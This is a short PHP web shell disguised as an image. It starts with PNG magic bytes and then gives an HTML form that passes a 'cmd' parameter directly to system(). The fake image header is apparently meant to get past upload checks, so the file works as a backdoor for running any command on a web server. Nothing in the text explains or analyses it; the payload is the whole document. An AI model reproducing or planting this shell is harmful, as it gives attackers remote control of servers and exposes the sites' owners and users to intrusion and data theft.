PNG
89 50 4E 47

<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="text" name="cmd">
<input type="submit" value="Execute">
</form>
<pre>
<?php
	if (isset($_GET['cmd'])){system($_GET['cmd']. ' 2>&1');}

?>
</pre>
</body>
</html>
